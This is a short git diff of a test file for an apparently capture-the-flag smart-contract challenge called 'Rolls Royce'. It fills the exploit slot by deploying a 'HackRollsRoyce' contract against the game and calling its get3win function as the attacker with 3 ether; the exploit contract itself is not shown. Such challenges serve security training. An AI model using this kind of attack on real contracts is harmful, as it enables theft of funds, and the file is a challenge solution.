@@ -32,6 +32,14 @@ describe('[Challenge] Rolls Royce', function() {
 
   it('Exploit', async function() {
     /** CODE YOUR EXPLOIT HERE */
+    this.exploit = await (await ethers.getContractFactory(
+      'HackRollsRoyce',
+      deployer,
+      ))
+    .deploy(this.game.address);
+
+    await this.exploit.connect(attacker).get3win({value: ethers.utils.parseEther('3')});
+
   });
 
   after(async function() {
